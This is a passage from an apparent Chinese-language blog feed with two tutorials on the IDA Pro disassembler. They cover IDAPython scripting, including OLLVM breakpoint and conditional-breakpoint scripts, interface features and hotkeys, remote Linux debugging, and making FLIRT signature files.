        dd.append(idc.read_dbg_byte(addr+i))
    return bytes(dd)
</code></pre>
<p>本地内存操作（会修改idb数据库）</p>
<pre><code class="py">idc.get_qword(addr)
idc.patch_qword(addr,val)
idc.patch_dword(addr,val)
idc.patch_word(addr,val)
idc.patch_byte(addr,val)
idc.get_bytes(addr,size)
</code></pre>
<p>反汇编操作</p>
<pre><code class="py">idc.GetDisasm(addr) # 只能返回一条汇编指令
idc.next_head(addr) # 获取下一条汇编指令的地址
</code></pre>
<p>交叉引用分析</p>
<pre><code class="py">for ref in idautils.XrefsTo(ea):
    print(hex(ref.frm))
</code></pre>
<p>杂项常用接口</p>
<pre><code class="py">idc.add_bpt(addr) # 添加断点
idaapi.get_imagebase() # 获取基地址
idc.create_insn(addr) # 生成汇编指令，相当于快捷键C 常用于固件分析
ida_funcs.add_func(addr) # 生成函数，相当于快捷键p
ida_bytes.create_strlit(addr) # 生成字符串，相当于快捷键A
</code></pre>
<p>函数遍历</p>
<pre><code class="py">for func in idautils.Functions():
    print(&quot;0x%x,%s&quot; % (func,idc.get_func_name(func)))
</code></pre>
<p>基本块的遍历</p>
<pre><code class="py">fn = 目标函数地址
f_blocks = idaapi.FlowChart(idaapi.get_func(fn),flags=idaapi.FC_PREDS)
for blocks in f_blocks:
    print(hex(blocks.start_ea))
    # 基本块的前驱
    for pre in blocks.preds():
        print(hex(pre.start_ea))
    # 基本块的后继
    for sucess in blocks.succs():
        print(hex(sucess.start_ea))
</code></pre>
<p>指令遍历</p>
<pre><code class="py">for ins in idautils.FuncItems(addr):
    print(hex(ins))
</code></pre>
<h3 id="实战部分"><a href="#实战部分" class="headerlink" title="实战部分"></a>实战部分</h3><p>ollvm批量断点设置：</p>
<p>实验材料：ollvm-flat</p>
<p>注意：<strong>判断真实块的依据是查找</strong> <strong>ollvm</strong> <strong>汇集点基本块的交叉引用，不一定准确</strong></p>
<p>断点脚本：</p>
<pre><code class="py">import idc
import idaapi
import struct
import idautils

# ollvm函数地址
fn = 0x401F60
# ollvm基本块汇集地址
ollvm_tail = 0x405D4B
# 拿到函数基本块的迭代器
f_blocks = idaapi.FlowChart(idaapi.get_func(fn),flags=idaapi.FC_PREDS)
# 然后遍历函数基本块
for block in f_blocks:
    # 拿到每个基本块的后驱
    for sucess in block.succs():
        if sucess.start_ea == ollvm_tail:
            print(hex(block.start_ea))
            idc.add_bpt(block.start_ea)
</code></pre>
<p>复制到ida下面，摁回车两次就行</p>
<p><img src="/./../images/image-20230119182419401.png" alt="image-20230119182419401"></p>
<p>成功打上断点，打上断点的基本块都是真实块</p>
<p><img src="/./../images/image-20230119182530944.png" alt="image-20230119182530944"></p>
<p>断点管理</p>
<p><img src="/./../images/image-20230119182636581.png" alt="image-20230119182636581"></p>
<p>全选右键生成文件夹</p>
<p><img src="/./../images/image-20230119182727613.png" alt="image-20230119182727613"></p>
<p>点击文件夹，进行断点的批量禁用或启用</p>
<p><img src="/./../images/image-20230119182906812.png" alt="image-20230119182906812"></p>
<p>条件断点脚本编写：</p>
<p>实验材料：dump_test.exe</p>
<p>目标：设置一个条件断点，当 rand 函数返回值为 16949 时停下</p>
<p>找到random函数</p>
<p><img src="/./../images/image-20230119183303757.png" alt="image-20230119183303757"></p>
<p>设置断点</p>
<p><img src="/./../images/image-20230119183327074.png" alt="image-20230119183327074"></p>
<p>在断点处右键编辑断点</p>
<p><img src="/./../images/image-20230119183413079.png" alt="image-20230119183413079"></p>
<p>脚本：</p>
<pre><code class="py">import idc
import idaapi
import struct
import idautils

def bp():
    rax = idc.get_reg_value(&#39;rax&#39;)
    return rax == 16949
</code></pre>
<p>先在ida中执行脚本</p>
<p>然后编辑断点，增加condition条件</p>
<p><img src="/./../images/image-20230119183620480.png" alt="image-20230119183620480"></p>
<p>然后运行程序</p>
<p>程序停下来后，就查看rax寄存器，经过16进制转10进制，结果正确</p>
<p><img src="/./../images/image-20230119183829577.png" alt="image-20230119183829577"></p>
<p>条件断点运用：dump rand 函数每一次执行结果，不让程序停下来</p>
<p>脚本：条件断点函数返回 False，IDA 不会命中该断点,利用这个特性提取运行时数据</p>
<pre><code class="py">def bp():
    rax = idc.get_reg_value(&#39;rax&#39;)
    print(rax,end=&#39;,&#39;)
    return False
</code></pre>
]]></content>
      <categories>
        <category>re</category>
        <category>技巧与典型场景</category>
      </categories>
      <tags>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA工具使用</title>
    <url>/2024/06/24/IDA%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>​	IDA逆向神器</p>
<span id="more"></span>

<h1 id="IDA工具介绍"><a href="#IDA工具介绍" class="headerlink" title="IDA工具介绍"></a>IDA工具介绍</h1><p>​	IDA Pro（交互式反汇编器专业版，我们一般简称为IDA）是一款递归下降的反汇编器，由Hex-Rays SA发布，是安全从事人员的必备工具之一。它强大的静态反汇编，反编译功能及动态调试功能让我们分析程序变得简单。它支持数十种CPU指令集其中包括[Intel x86](<a href="https://baike.baidu.com/item/Intel">https://baike.baidu.com/item/Intel</a> x86)，<a href="https://baike.baidu.com/item/x64/8161446">x64</a>，<a href="https://baike.baidu.com/item/MIPS/2173143">MIPS</a>，<a href="https://baike.baidu.com/item/PowerPC">PowerPC</a>，<a href="https://baike.baidu.com/item/ARM/7518299">ARM</a>，<a href="https://baike.baidu.com/item/Z80">Z80</a>，68000，c8051等等，无论是winodws平台下的pe可执行文件，linux平台下的elf文件及ios平台下的Mach-O文件都适用。</p>
<p>一个简单的C语言程序用作实验。</p>
<img src="/./../images/image-20240624223417082.png" alt="image-20240624223417082" style="zoom: 67%;">

<p>IDA分为32版本与64版本，这是根据所要反汇编程序的位数来区分的，但其实他们自身都是64位的程序。</p>
<img src="/./../images/image-20240624223542585.png" alt="image-20240624223542585" style="zoom:67%;">

<p>根据程序的位数选择对应位数的IDA打开程序。（附件是64位的</p>
<p>一般没有特殊需求，我们直接默认点击OK就好了。</p>
<img src="/./../images/image-20240624223624670.png" alt="image-20240624223624670" style="zoom:67%;">

<p>点击Ok后接着的各种提示，如加载对应的pdb符号文件，统统点击否，然后进行来到载入主窗口。</p>
<img src="/./../images/image-20240624223755676.png" alt="image-20240624223755676" style="zoom:67%;">

<p>然后再关闭IDA,出现下面的提示框。</p>
<p>一般我我们就选择下面标出的2个选项中的一个即可。第一个保存为了下次分析继续使用，另外一个不保存。</p>
<img src="/./../images/image-20240624224547589.png" alt="image-20240624224547589" style="zoom:67%;">

<p>上一步点击保存文件退出后，将该exe文件再次重新载入IDA。</p>
<p>overwrite 重新写入，代表覆盖以前的。</p>
<p>load existing 加载已经存在的，就是直接加载我们之前分析过该程序保存的数据库文件，保存了上次的分析记录方便我们继续分析。</p>
<img src="/./../images/image-20240624224631709.png" alt="image-20240624224631709" style="zoom:67%;">

<p>IDA功能界面介绍</p>
<img src="/./../images/image-20240624224704443.png" alt="image-20240624224704443" style="zoom:67%;">

<p>流程图界面显示对应的伪代码，此界面下按 &#x2F; 即可。</p>
<img src="/./../images/image-20240624224743397.png" alt="image-20240624224743397" style="zoom:67%;">

<p>Text-view文本视图</p>
<img src="/./../images/image-20240624225000199.png" alt="image-20240624225000199" style="zoom:67%;">

<p>切换图形视图和文本视图（点空格键就行）</p>
<img src="/./../images/image-20240624225021469.png" alt="image-20240624225021469" style="zoom:67%;">

<h2 id="IDA功能界面介绍"><a href="#IDA功能界面介绍" class="headerlink" title="IDA功能界面介绍"></a>IDA功能界面介绍</h2><p>导航栏</p>
<img src="/./../images/image-20240624225156980.png" alt="image-20240624225156980" style="zoom:67%;">

<ul>
<li>- 蓝色:.text section</li>
<li>- 深蓝:用户写的函数编译后的代码区</li>
<li>- 浅蓝:编译器自己添加的函数，像启动函数，异常函数等等..</li>
<li>- 粉红色:.idata section 有关输入表的一些数据信息</li>
<li>- 军绿色：.rdata section 纯数据，只读</li>
<li>- 灰色:为了段对齐而留下的空隙</li>
<li>- 黑色: 禁区</li>
</ul>
<h3 id="汇编代码界面注释"><a href="#汇编代码界面注释" class="headerlink" title="汇编代码界面注释"></a>汇编代码界面注释</h3><p>一种是Enter comment(快捷键是shift+;))，另一种是Enter repeatable comment(快捷键是;和OD一样)</p>
<p>前一种输入的注释只在该处出现，后一种注释，会在所有交叉参考处出现，如果一个程序位置引用了另一个包含可重复注释的位置，则该注释会在第一个位置回显，且以灰色显示。</p>
<img src="/./../images/image-20240624225610836.png" alt="image-20240624225610836" style="zoom:67%;">

<h3 id="伪代码代码界面注释，快捷键-x2F"><a href="#伪代码代码界面注释，快捷键-x2F" class="headerlink" title="伪代码代码界面注释，快捷键 &#x2F;"></a>伪代码代码界面注释，快捷键 &#x2F;</h3><img src="/./../images/image-20240624225839579.png" alt="image-20240624225839579" style="zoom:67%;">

<h3 id="字符串窗口-shift-f12"><a href="#字符串窗口-shift-f12" class="headerlink" title="字符串窗口 shift+f12"></a>字符串窗口 shift+f12</h3><p>程序中被IDA解析出来的字符串，当然还有因为未解析出来所以没显示的。	 	</p>
<img src="/./../images/image-20240624225955694.png" alt="image-20240624225955694" style="zoom:67%;">

<h3 id="导入表窗口"><a href="#导入表窗口" class="headerlink" title="导入表窗口"></a>导入表窗口</h3><p>程序从动态链接库中导入的要使用的函数。</p>
<img src="/./../images/image-20240625100801523.png" alt="image-20240625100801523" style="zoom:67%;">

<h3 id="导出表窗口"><a href="#导出表窗口" class="headerlink" title="导出表窗口"></a>导出表窗口</h3><p>程序导出给其它程序使用的函数。</p>
<img src="/./../images/image-20240625100939872.png" alt="image-20240625100939872" style="zoom:67%;">

<h3 id="十六进制数据窗口"><a href="#十六进制数据窗口" class="headerlink" title="十六进制数据窗口"></a>十六进制数据窗口</h3><p>类似于一个十六进制编辑工具看文件的二进制信息</p>
<img src="/./../images/image-20240625101040674.png" alt="image-20240625101040674" style="zoom:67%;">

<h3 id="函数窗口"><a href="#函数窗口" class="headerlink" title="函数窗口"></a>函数窗口</h3><p>对于ida没有识别出来的函数，统统以sub_函数地址命名。</p>
<p>为了方便，我们还可以直接在函数窗口ctrl+f，然后搜索目标函数。</p>
<img src="/./../images/image-20240625101251726.png" alt="image-20240625101251726" style="zoom:67%;">

<h3 id="结构体窗口"><a href="#结构体窗口" class="headerlink" title="结构体窗口"></a>结构体窗口</h3><p>这里显示了本次分析程序ida中已经定义了的结构体，同时我们也可以在插入创建新的结构体。</p>
<img src="/./../images/image-20240625101410492.png" alt="image-20240625101410492" style="zoom:67%;">

<h3 id="rdata段中的字符串"><a href="#rdata段中的字符串" class="headerlink" title=".rdata段中的字符串"></a>.rdata段中的字符串</h3><p>用于定义字符串都在一块内存区域，根据这个也是定位找字符串的方法。</p>
<p>如下，.rdata段的字符串信息，最右边的是隐式的可重复注释，指示的那里引用了该字符串。<img src="/./../images/image-20240625101520158.png" alt="image-20240625101520158" style="zoom:67%;"></p>
<h3 id="寻找入口点-快捷键-ctrl-e"><a href="#寻找入口点-快捷键-ctrl-e" class="headerlink" title="寻找入口点 快捷键 ctrl+e"></a>寻找入口点 快捷键 ctrl+e</h3><p>在IDA载入程序分析完毕后，ctrl+e打开选择程序入口点的窗口，这里可以方便找到程序的入口点及用到的回调函数。<img src="/./../images/image-20240625101703454.png" alt="image-20240625101703454" style="zoom:67%;"></p>
<h3 id="地址跳转-快捷键-G"><a href="#地址跳转-快捷键-G" class="headerlink" title="地址跳转 快捷键 G"></a>地址跳转 快捷键 G</h3><p>按下快捷键 G，输入地址后跳转到目的地址<img src="/./../images/image-20240625103013716.png" alt="image-20240625103013716" style="zoom:67%;"></p>
<h3 id="参考重命名-在变量名下按-n"><a href="#参考重命名-在变量名下按-n" class="headerlink" title="参考重命名 在变量名下按 n"></a>参考重命名 在变量名下按 n</h3><p>在分析一个程序时，我们可以对一些变量或者函数重命名，改成我们易于我们理解的名字，便于分析程序。</p>
<p>如下，假如我们知道了v12变量是一个计数功能，那我们就可以给他重命名为 <strong>count</strong><img src="/./../images/image-20240625103212589.png" alt="image-20240625103212589" style="zoom:67%;"></p>
<h3 id="参考类型修改-在变量名下按-y"><a href="#参考类型修改-在变量名下按-y" class="headerlink" title="参考类型修改 在变量名下按 y"></a>参考类型修改 在变量名下按 y</h3><p>在分析一个程序时，IDA对一些变量名可能解析的不是很正确，这就需要我们手动去修改变量的类型。</p>
<p>如下所示，在v12变量下按y键后再输入我们要修改的变量类型。<img src="/./../images/image-20240625103350144.png" alt="image-20240625103350144" style="zoom:67%;"></p>
<h3 id="数据转化为代码-在数据开始的地方按-C"><a href="#数据转化为代码-在数据开始的地方按-C" class="headerlink" title="数据转化为代码 在数据开始的地方按 C"></a>数据转化为代码 在数据开始的地方按 C</h3><p>在分析一个程序时，有时候因为栈帧或者其它原因使IDA不能反编一个函数有问题，又或者程序有smc，我们在手动对数据解码后，接着在解码数据开始的地方按C键就将数据转化为代码了。如下所示，我们在57h的地方按下C键，IDA就会自动对数据解析成代码了。<img src="/./../images/image-20240625103448935.png" alt="image-20240625103448935" style="zoom:67%;"></p>
<h3 id="创建函数-在代码开始的地方按-P"><a href="#创建函数-在代码开始的地方按-P" class="headerlink" title="创建函数 在代码开始的地方按 P"></a>创建函数 在代码开始的地方按 P</h3><p>如上一步中所说的，我们先对数据按C键将数据转化为了代码，这时候还需要在代码开始的地方按p键，让IDA在将一段代码上创建成一个函数。</p>
<p>如下，可以注意到左边的地址是红色，这时候我们在0x4025A0地址下按p就在这一段汇编创建函数且左边的红色地址消失。</p>
<img src="/./../images/image-20240625103917545.png" alt="image-20240625103917545" style="zoom:67%;">

<h3 id="取消定义-在需要取消定义的地方按-U"><a href="#取消定义-在需要取消定义的地方按-U" class="headerlink" title="取消定义 在需要取消定义的地方按 U"></a>取消定义 在需要取消定义的地方按 U</h3><p>通过在指定的数据或者代码下按U键我们可以取消IDA对该数据的定义，如代码，数组等。</p>
<p>如下，我们在aDS按u键后，得到了下面第二张图的结果。<img src="/./../images/image-20240625104241055.png" alt="image-20240625104241055" style="zoom:67%;"></p>
<h3 id="定义数组-在需要定义为数组的数据开始的地方按"><a href="#定义数组-在需要定义为数组的数据开始的地方按" class="headerlink" title="定义数组 在需要定义为数组的数据开始的地方按 *"></a>定义数组 在需要定义为数组的数据开始的地方按 *</h3><p>分析一个程序时，我们有时候在硬编码的数据中看见一段连续的数据且我们确定它为数组，但IDA并没有将其解析为数组，这时候我们就可以在这段数据开始的地方按下*，弹出如下所示的框：</p>
<p>选好满足我们要求的选项后，按ok即可。<img src="/./../images/image-20240625105751524.png" alt="image-20240625105751524" style="zoom:67%;"></p>
<h3 id="提取数据-选中要提取数据后按shift-e"><a href="#提取数据-选中要提取数据后按shift-e" class="headerlink" title="提取数据 选中要提取数据后按shift+e"></a>提取数据 选中要提取数据后按shift+e</h3><p>在我们需要得到程序中的一段数据时，我们可以先选中这段数据然后按shift+e</p>
<p>如下，我们先选中数据，接着按shift+e后得到下面的第二组图：<img src="/./../images/image-20240625110450627.png" alt="image-20240625110450627" style="zoom:67%;"><img src="/./../images/image-20240625110516853.png" alt="image-20240625110516853" style="zoom:67%;"></p>
<h3 id="标签的使用-加标记：alt-m-跳转到标记：ctrl-m"><a href="#标签的使用-加标记：alt-m-跳转到标记：ctrl-m" class="headerlink" title="标签的使用 加标记：alt+m  跳转到标记：ctrl+m"></a>标签的使用 加标记：alt+m  跳转到标记：ctrl+m</h3><p>使用标签功能我们可以在程序代码的任何位置快速跳到我们做了标签的地方，这对于快速跳到关键代码的位置是很实用的。</p>
<p>如在下图中，我们知道了0x4015A2地址处是printf的功能，那么我们可以在这个地址下按alt+m,对这个地址加上printf的标记。那么当我们此时在程序任何位置，按crtl+m，选中printf标记就可以快速跳回到这里了。<img src="/./../images/image-20240625125317577.png" alt="image-20240625125317577"></p>
<h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><ul>
<li>F5 : 反汇编当前函数</li>
<li>; ：为当前指令添加全文交叉引用的注释</li>
<li>N ：定义或修改名称，通常用来标注函数名</li>
<li>G ：跳转到任意地址</li>
<li>Esc ：返回到跳转前的位置</li>
<li>H ：十六进制显示数据</li>
<li>y ：改变数据类型</li>
<li>X ：查看按上层调用</li>
<li>Space :图形视图和文本视图切换</li>
<li>Shift+f12：字符串窗口列表</li>
<li>二进制搜索：alt+b</li>
<li>文本搜索：alt+t</li>
<li>快照：shift+ctrl+w</li>
<li>tab：反编译与流程图切换</li>
<li>alt+a：字符串操作</li>
<li>流程按&#x2F;：流程图加上伪代码</li>
</ul>
<h3 id="IDA插件的安装"><a href="#IDA插件的安装" class="headerlink" title="IDA插件的安装"></a>IDA插件的安装</h3><p>若我们有想要安装的插件，直接到将其放到IDA安装目录中的plugins文件夹下即可。<img src="/./../images/image-20240625130110115.png" alt="image-20240625130110115" style="zoom:67%;"></p>
<hr>
<h1 id="IDA的高级使用"><a href="#IDA的高级使用" class="headerlink" title="IDA的高级使用"></a>IDA的高级使用</h1><h3 id="ida中字符串搜索的技巧"><a href="#ida中字符串搜索的技巧" class="headerlink" title="ida中字符串搜索的技巧"></a>ida中字符串搜索的技巧</h3><p>ida中有两种搜索：文本搜索（alt+t），二进制搜索（alt+b）</p>
<p>而文本搜索是很局限的，他只是对在shift+f12中ida已经列出来的字符串中搜索，对于很多很多中文字符串，宽字符它都是搜索不出来的。</p>
<p>所以一般着重使用二进制搜索：</p>
<p>1.对要搜索的十六进制字符串以空格分隔为两位十六进制值组成的列表。</p>
<p>2.要搜索内嵌的字符串数据，必须将要搜索的字符串用双引号括起来。</p>
<p>3.在搜索十六进制字节序列时，最好选中Match_case选项，不然，假如要搜索的序列为：E9 41 C3，而E9 61 C3也出现在了搜索结果中。这是因为，0x41对应于字符A，而0x61则对应于字符a，所以IDA认为这两个字符串相互匹配。<img src="/./../images/image-20240625130539779.png" alt="image-20240625130539779" style="zoom:67%;"></p>
<h3 id="得到一个函数与调用它的函数之间关系图"><a href="#得到一个函数与调用它的函数之间关系图" class="headerlink" title="得到一个函数与调用它的函数之间关系图"></a>得到一个函数与调用它的函数之间关系图</h3><p>在一个函数的图形化界面右键选择Xref graph to..</p>
<p>如下得到了main函数与调用main函数之间的关系图<img src="/./../images/image-20240625130826952.png" alt="image-20240625130826952" style="zoom:67%;"></p>
<h3 id="得到一个函数与它调用的函数之间关系图"><a href="#得到一个函数与它调用的函数之间关系图" class="headerlink" title="得到一个函数与它调用的函数之间关系图"></a>得到一个函数与它调用的函数之间关系图</h3><p>在一个函数的图形化界面右键选择Xref graph from..</p>
<p>如下得到了main函数与main调用函数之间的关系图<img src="/./../images/image-20240625131500262.png" alt="image-20240625131500262"></p>
<h3 id="修改字符串窗口的设置以得到尽可能多的字符串"><a href="#修改字符串窗口的设置以得到尽可能多的字符串" class="headerlink" title="修改字符串窗口的设置以得到尽可能多的字符串"></a>修改字符串窗口的设置以得到尽可能多的字符串</h3><p>有时候我们可能发现程序中长度为4的关键字符串在字符串窗口找不到，其实这是ida中设置的原因，默认字符串窗口能显示的字符串长度为5。</p>
<p>在字符串窗口右键后点击Setup，然后将最小字符串长度改为4就好。<img src="/./../images/image-20240625131758472.png" alt="image-20240625131758472" style="zoom:67%;"></p>
<h3 id="对比源代码中结构的定义与ida对结构体反编译结果来熟悉看伪代码"><a href="#对比源代码中结构的定义与ida对结构体反编译结果来熟悉看伪代码" class="headerlink" title="对比源代码中结构的定义与ida对结构体反编译结果来熟悉看伪代码"></a>对比源代码中结构的定义与ida对结构体反编译结果来熟悉看伪代码</h3><p>源代码：</p>
<pre><code class="C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt; 

typedef struct _Link
&#123;
    int data;
    char a[20];
    struct _Link *next;
&#125; Link, *pLink;
 
int main(void)	
&#123;
    pLink head;
    Link link, link1;
    
    head = &amp;link;
    link.data = 1;
    strcpy(link.a, &quot;IDA工具的使用&quot;); 
    link1.data = 2;
    strcpy(link1.a, &quot;learning!&quot;);
    link.next = &amp;link1;
    link1.next = NULL;
    
    while(head)
    &#123;
        printf(&quot;%d %s\n&quot;, head-&gt;data, head-&gt;a);
        head = head-&gt;next;
    &#125;
    
    putchar(10);
    system(&quot;pause&quot;);
    
    return 0;
&#125;
</code></pre>
<p>Ida反编译结果：</p>
<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  Link link; // [rsp+20h] [rbp-50h] BYREF
  Link link1; // [rsp+40h] [rbp-30h] BYREF
  pLink head; // [rsp+68h] [rbp-8h]

  _main();
  head = &amp;link;
  link.data = 1;
  *(_QWORD *)link.a = 0xB5DFBEA4B9414449ui64;
  *(_DWORD *)&amp;link.a[8] = -742798652;
  *(_WORD *)&amp;link.a[12] = 195;
  link1.data = 2;
  strcpy(link1.a, &quot;learning!&quot;);
  link.next = &amp;link1;
  link1.next = 0i64;
  while ( head )
  &#123;
    printf(&quot;%d %s\n&quot;, (unsigned int)head-&gt;data, head-&gt;a);
    head = head-&gt;next;
  &#125;
  putchar(10);
  system(&quot;pause&quot;);
  return 0;
&#125;
</code></pre>
<h3 id="对比源代码中结构的定义与ida对结构体反编译结果来熟悉看伪代码-1"><a href="#对比源代码中结构的定义与ida对结构体反编译结果来熟悉看伪代码-1" class="headerlink" title="对比源代码中结构的定义与ida对结构体反编译结果来熟悉看伪代码"></a>对比源代码中结构的定义与ida对结构体反编译结果来熟悉看伪代码</h3><p>从上面的结果我们可以看出，源代码中定义的结构体它的实质就是分配一块内存，然后这块内存组织了其中变量。但是ida反编译时并不能将其还原出来，它只能得到它的实质结果，那就是一段连续的空间上每个变量分别定义出来。我们在分析出结构体后，插入创建分析出的结构体后再应用就能在IDA中还原出结构体了。<img src="/./../images/image-20240625132903604.png" alt="image-20240625132903604"></p>
<h3 id="IDA中python脚本的编写-载入脚本执行：alt-f7-打开执行脚本窗口：shift-f2"><a href="#IDA中python脚本的编写-载入脚本执行：alt-f7-打开执行脚本窗口：shift-f2" class="headerlink" title="IDA中python脚本的编写 载入脚本执行：alt+f7 打开执行脚本窗口：shift+f2"></a>IDA中python脚本的编写 载入脚本执行：alt+f7 打开执行脚本窗口：shift+f2</h3><p>在下面的窗口中写python代码可以很好的和IDA交互。要用的api查官方文档：<a href="https://hex-rays.com/wp-content/static/products/ida/support/idapython_docs/">https://hex-rays.com/wp-content/static/products/ida/support/idapython_docs/</a><img src="/./../images/image-20240625153316743.png" alt="image-20240625153316743" style="zoom:67%;"></p>
<h2 id="解决ida反编译遇到：Decompilation-failure-xxxx-too-big-function"><a href="#解决ida反编译遇到：Decompilation-failure-xxxx-too-big-function" class="headerlink" title="解决ida反编译遇到：Decompilation failure:xxxx:too big function"></a>解决ida反编译遇到：Decompilation failure:xxxx:too big function</h2><p>这是因为ida默认反编译函数的大小只有64K，所以这里会反编译会失败。<img src="/./../images/image-20240625153453498.png" alt="image-20240625153453498"></p>
<p>这个问题可以通过修改反编译插件的配置文件\cfg\hexrays.cfg中MAX_FUNCSIZE，改为1024就好了<img src="/./../images/image-20240625153513048.png" alt="image-20240625153513048"></p>
<h3 id="动调调试-windows"><a href="#动调调试-windows" class="headerlink" title="动调调试-windows"></a>动调调试-windows</h3><p>按下图所示选择好指定好选项，程序中下好断点，直接F9程序就调试起来了。<img src="/./../images/image-20240625153612954.png" alt="image-20240625153612954" style="zoom:67%;"></p>
<h3 id="动调调试-linux-x86"><a href="#动调调试-linux-x86" class="headerlink" title="动调调试-linux-x86"></a>动调调试-linux-x86</h3><p>首先找到IDA的dbgsrv文件夹<img src="/./../images/image-20240625153657427.png" alt="image-20240625153657427" style="zoom:67%;"></p>
<p>进入dbgsrv文件夹</p>
<p>其中linux_server是我们调试32elf文件所要使用的服务程序，linux_server64是调试64elf所要使用的服务程序。<img src="/./../images/image-20240625153723917.png" alt="image-20240625153723917" style="zoom:67%;"></p>
<p>将上面提到的2个服务程序复制到linux虚拟机和所要调试的文件放在同一个文件夹下。这里为了以后方便也可以放入&#x2F;usr&#x2F;bin&#x2F;下，以后直接通过命令（linux_server或linux_server64）就启动了。<img src="/./../images/image-20240625153832400.png" alt="image-20240625153832400" style="zoom:67%;"></p>
<p>使用chmod 777 linux_server linux_server64，赋予这两个文件有执行的权限。</p>
<p>然后根据我们所要调试程序的位数启动对应版本的服务程序。<img src="/./../images/image-20240625153909254.png" alt="image-20240625153909254"></p>
<p>使用ifconfig命令查看当前虚拟机的ip地址<img src="/./../images/image-20240625153927204.png" alt="image-20240625153927204" style="zoom:67%;"></p>
<p>配置ida中调试选项<img src="/./../images/image-20240625153950841.png" alt="image-20240625153950841" style="zoom:67%;"></p>
<p>最后注意本机与目的linux环境能相互ping通，下好断点，直接F9启动程序即开始调试。</p>
<h2 id="IDA中制作sig文件"><a href="#IDA中制作sig文件" class="headerlink" title="IDA中制作sig文件"></a>IDA中制作sig文件</h2><h3 id="IDA中的sig文件是什么？"><a href="#IDA中的sig文件是什么？" class="headerlink" title="IDA中的sig文件是什么？"></a>IDA中的sig文件是什么？</h3><p>它是满足IDA中FLIRT(库文件快速识别与鉴定技术)而使用的一种签名文件。它使用自定义的格式，记录了一些库函数的特征序列值。在我们找到合适的库文件并以此制作相应的签名文件后将其应用IDA中，它将通过特征值自动去匹配程序中的函数，并对匹配上的函数自动重命名（要注意的是：就算匹配上它也只会对IDA默认命名函数的函数重命名，换句话说就是如果之前我们对该函数已经进行了重命名，那么之后就算签名文件匹配上这个函数也不会对其进行重命名）。这能很好的解决静态编译且去除符号程序因本身函数与库函数混杂在一起增大了我们分析程序难度的问题，帮助减少工作能，更快的去分析程序本身的函数。</p>
<h3 id="IDA中自带的签名文件"><a href="#IDA中自带的签名文件" class="headerlink" title="IDA中自带的签名文件"></a>IDA中自带的签名文件</h3><p>在IDA安装目录中的sig文件夹下我们能找到IDA中本身自带的签名文件。不同文件夹表示不同架构平台要使用的签名文件。这里我们在自己添加签名文件时也一定要注意好其架构。<img src="/./../images/image-20240625154211982.png" alt="image-20240625154211982" style="zoom:67%;"></p>
<p>在IDA自带的签名文件中只有一小部分类unix下的签名文件，这是因为在类unix下使用编译器的是开源的gcc，不同的linux发行版本的libc.a也都不尽相同且更新很快，IDA也就不可能把所有版本的libc.a都制作一份签名文件保存下来。所以在我们分析静态链接且去除了符号表的elf文件时，可以发现很多库函数都没有识别出来，这在程序很大时无疑增加了它的分析难度和我们所花费的精力。</p>
<p>下面也是以一个静态链接且<strong>去除了符号的elf文件</strong>来一步一步找到它的库并制作相应的sig文件进而恢复它的符号。</p>
<h3 id="查看分析的elf文件未引用sig文件时的main函数"><a href="#查看分析的elf文件未引用sig文件时的main函数" class="headerlink" title="查看分析的elf文件未引用sig文件时的main函数"></a>查看分析的elf文件未引用sig文件时的main函数</h3><p>如下所示，所有函数都是没有符号的。<img src="/./../images/image-20240625154929920.png" alt="image-20240625154929920" style="zoom:67%;"></p>
<h3 id="查看该elf文件的字符串信息尽可能找到该elf文件的编译平台"><a href="#查看该elf文件的字符串信息尽可能找到该elf文件的编译平台" class="headerlink" title="查看该elf文件的字符串信息尽可能找到该elf文件的编译平台"></a>查看该elf文件的字符串信息尽可能找到该elf文件的编译平台</h3><blockquote>
<p>strings -a 1 | grep ‘ubun’</p>
</blockquote>
<img src="/./../images/image-20240625155210709.png" alt="image-20240625155210709">

<h3 id="找到目标环境下的libc-a文件"><a href="#找到目标环境下的libc-a文件" class="headerlink" title="找到目标环境下的libc.a文件"></a>找到目标环境下的libc.a文件</h3><blockquote>
<p>whereis libc.a</p>
</blockquote>
<p><img src="/./../images/image-20240625155334421.png" alt="image-20240625155334421"></p>
<h3 id="下载IDA官方提供的FLAIR工具集，我们选择使用linux下平台的文件"><a href="#下载IDA官方提供的FLAIR工具集，我们选择使用linux下平台的文件" class="headerlink" title="下载IDA官方提供的FLAIR工具集，我们选择使用linux下平台的文件"></a>下载IDA官方提供的FLAIR工具集，我们选择使用linux下平台的文件</h3><p>将linux文件夹拖入我们的linux环境中</p>
<p><img src="/./../images/image-20240625155416288.png" alt="image-20240625155416288"></p>
<h3 id="使用linux文件下的pelf将libc-a转化为libc-pat"><a href="#使用linux文件下的pelf将libc-a转化为libc-pat" class="headerlink" title="使用linux文件下的pelf将libc.a转化为libc.pat"></a>使用linux文件下的pelf将libc.a转化为libc.pat</h3><blockquote>
<p>.&#x2F;linux&#x2F;pelf libc.a libc.pat</p>
</blockquote>
<p>如果正常的话不会有提示信息，在当前文件下生成libc.pat文件。</p>
<p>但也常出现下面这个错误：<img src="/./../images/image-20240625155543066.png" alt="image-20240625155543066"></p>
<p>看意思是不能识别重定位类型，那我们在上面的命令下加上如下选项即可：</p>
<blockquote>
<p>.&#x2F;linux&#x2F;pelf -r42:0:0 libc.a libc.pat</p>
</blockquote>
<p>42是重定位类型，根据提示的错误来。</p>
<h3 id="接着使用sigmake将libc-pat文件制作成libc-sig文件"><a href="#接着使用sigmake将libc-pat文件制作成libc-sig文件" class="headerlink" title="接着使用sigmake将libc.pat文件制作成libc.sig文件"></a>接着使用sigmake将libc.pat文件制作成libc.sig文件</h3><blockquote>
<p>.&#x2F;linux&#x2F;sigmake -n“my_sig” libc.pat libc.sig  -n后是添加的注释信息</p>
</blockquote>
<p>正常的话也是直接就生成相应的sig文件了。但也常出现下面的错误：</p>
<p>意思是有22个函数它们同一个特征值不止对应一个函数，如果制作成了sig文件在匹配成功时也不知道到底应用那个函数名字。</p>
<p><img src="/./../images/image-20240625162838622.png" alt="image-20240625162838622"></p>
